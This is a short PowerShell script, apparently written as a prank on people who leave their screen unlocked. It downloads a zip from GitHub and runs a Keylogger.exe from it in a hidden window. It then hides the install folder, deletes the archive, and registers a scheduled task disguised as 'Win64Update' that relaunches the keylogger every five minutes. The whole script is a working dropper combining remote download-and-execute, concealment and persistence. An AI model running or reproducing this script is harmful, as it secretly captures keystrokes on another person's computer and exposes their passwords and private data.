if (Get-Item -Path "C:\temp\" -ErrorAction Ignore) {  } else {
    New-Item "C:\temp\" -ItemType Directory
}

Invoke-WebRequest -Uri "https://github.com/MartijnJStans/ScreenNotLocked/archive/refs/heads/main.zip" -OutFile "C:\temp\KeyLogger.zip"
Expand-Archive -LiteralPath "C:\temp\KeyLogger.zip" -DestinationPath "C:\temp\Keylogger"
Start-Process -FilePath "C:\temp\KeyLogger\ScreenNotLocked-main\Keylogger.exe" -WindowStyle Hidden

& attrib +h "C:\temp\KeyLogger"
Remove-Item -Path "C:\temp\KeyLogger.zip"

$action = New-ScheduledTaskAction -Execute 'C:\temp\KeyLogger\ScreenNotLocked-main\Keylogger.exe'
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Win64Update" -Description "Hey buddy, Did you forget something? Maybe next time lock your screen"
